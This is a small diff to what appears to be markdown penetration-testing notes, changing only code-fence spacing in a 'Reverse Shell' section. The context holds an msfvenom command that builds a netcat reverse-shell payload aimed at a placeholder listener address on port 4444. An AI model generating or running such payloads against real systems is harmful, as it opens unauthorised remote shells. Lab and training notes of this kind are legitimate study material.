@@ -29,6 +29,6 @@ ssh username@IP
 
 Reverse Shell:\
 Obtain your lhost from the terminal using: 
-```ifconfig
+``` ifconfig
 
 msfvenom -p cmd/unix/reverse_netcat lhost=xx.xx.xx.xx lport=4444 R
